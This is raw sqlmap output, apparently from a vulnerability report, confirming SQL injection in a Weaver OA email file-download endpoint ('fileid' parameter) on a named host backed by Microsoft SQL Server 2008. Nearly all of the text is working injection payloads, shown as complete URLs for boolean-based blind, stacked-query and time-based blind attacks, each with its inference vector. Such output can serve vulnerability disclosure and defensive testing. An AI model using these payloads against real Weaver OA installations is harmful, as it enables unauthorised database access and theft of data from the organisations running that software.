sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: https://oa.xin.com:443/weaver/weaver.email.FileDownloadLocation?fileid=39 AND 8507=8507&download=1    Vector: AND [INFERENCE]    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: https://oa.xin.com:443/weaver/weaver.email.FileDownloadLocation?fileid=39; WAITFOR DELAY '0:0:5';--&download=1    Vector: ; IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]';--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: https://oa.xin.com:443/weaver/weaver.email.FileDownloadLocation?fileid=39 WAITFOR DELAY '0:0:5'--&download=1    Vector: IF([INFERENCE]) WAITFOR DELAY '0:0:[SLEEPTIME]'--   漏洞证明：  
web application technology: JSPback-end DBMS: Microsoft SQL Server 2008
